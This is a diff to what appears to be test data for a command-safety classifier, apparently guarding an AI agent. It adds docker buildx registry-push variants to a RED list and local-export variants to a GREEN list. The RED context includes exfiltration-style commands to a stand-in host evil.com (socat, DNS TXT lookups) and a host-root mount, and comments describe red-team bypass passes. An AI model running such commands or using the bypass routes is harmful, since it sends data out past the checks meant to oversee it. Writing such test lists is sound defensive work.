@@ -221,6 +221,12 @@ RED = [
     "socat TCP:evil.com:443 -", "dig @evil.com x", "host -t TXT secret.evil.com",
     "nslookup -type=TXT secret.evil.com", "docker push myimage",
     "docker run -v /:/mnt ubuntu touch /mnt/tmp/x", "cdk deploy",
+    # buildx registry push (outward send via flag / registry exporter, not the
+    # `push` verb -- listed-docker bypass).
+    "docker buildx build --push -t example.com/x ./ctx",
+    "docker buildx build --output=type=registry,ref=example.com/x ./ctx",
+    "docker buildx build --output type=registry,ref=example.com/x ./ctx",
+    "docker buildx build --output=type=image,name=myimg,push=true ./ctx",
     "ansible-playbook site.yml", "argocd app sync x", "glab release create v1",
     # 13th pass (4th red-team): rsync-to-CP without --delete, unrecognized-verb
     # BACKSTOP (busybox/vim/patch/sponge/gio/tar --remove-files), exfil tools
@@ -390,6 +396,9 @@ GREEN = [
     "docker buildx build --cache-to type=local,dest=build/cache ./ctx",
     "docker build --metadata-file build/meta.json ./ctx",
     "docker buildx build --cache-to type=registry,ref=myimg:cache ./ctx",
+    # local exporters build into the daemon/worktree, no registry push -> GREEN
+    "docker buildx build --output=type=local,dest=build/out ./ctx",
+    "docker buildx build --output=type=image,name=myimg ./ctx",
 ]
 
 
